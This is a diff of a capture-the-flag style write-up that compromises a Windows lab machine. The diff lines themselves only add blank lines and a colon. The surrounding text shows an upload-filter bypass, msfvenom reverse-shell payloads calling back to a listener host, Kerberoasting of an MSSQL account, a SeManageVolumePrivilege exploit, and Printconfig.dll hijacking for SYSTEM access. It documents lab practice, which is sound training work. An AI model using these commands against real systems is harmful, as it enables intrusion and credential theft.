@@ -32,6 +32,7 @@ Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 ## HTTP 80
 As soon as I saw the HTTP port opened, I started to do some enumeration to it. Firstly we enumerate the directories with ffuf tool, and take notice at some 301 status results.
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026125821.png?raw=true)
 
 The webpage allows us to upload image files when we try to buy a ticket, but it does not allow to upload php files...
@@ -55,18 +56,23 @@ msfvenom -p windows/shell_reverse_tcp  LHOST=192.168.45.187 LPORT=443 -f exe -o 
 ```
 
 Then we upload all three files rev.exe, run.ctp and the new .htaccess. Afterwards we execute the run.ctp. It will call rev.exe and give us a revshell in our nc listener:
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026134026.png?raw=true)
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026133617.png?raw=true)
+
 As we can see, we have gained access as service account svc_apache, so our next step will be privilege escalation.
 # PrivEsc
 
 ## Manual
 Being a service account, we do not have access to local.txt flag. By enumerating domain users we see MSSQL service account. A possible exploitation could be to ask for a kerberos ticket.
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027102748.png?raw=true)
+
 In order to do that we would need the SPN. With `Get-SPN.ps1` powershell script we can get the SPN of the MSSQL account:
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027102834.png?raw=true)
+
 And with the following powershell commands we will obtain the kerberos hash:
 ```powershell
 Add-Type -AssemblyName System.IdentityModel
@@ -100,9 +106,13 @@ Running `whoami /priv` discloses a SeManageVolumePrivilege  token that we can us
 https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 
 Running this exploit gives us permissions on 918 entries. Among them we have the following directory:
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216104138.png?raw=true)
+
 Which previously only administrators had full control:
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216104229.png?raw=true)
+
 We can hijack one of the systems dll and trigger it in order to get a reverse shell. We will do this with Printconfig.dll. First we will create with msfvenom a malicious.dll containing a reverse shell:
 ```bash
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.216 LPORT=4444 -f dll -o Printconfig.dll
@@ -123,7 +133,8 @@ On execution we will get inmediately NT Authority\System access:
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105447.png?raw=true)
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105437.png?raw=true)
 
-Therefore, we can retrieve proof.txt flag
+Therefore, we can retrieve proof.txt flag:
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105535.png?raw=true)
 
 Pwned!
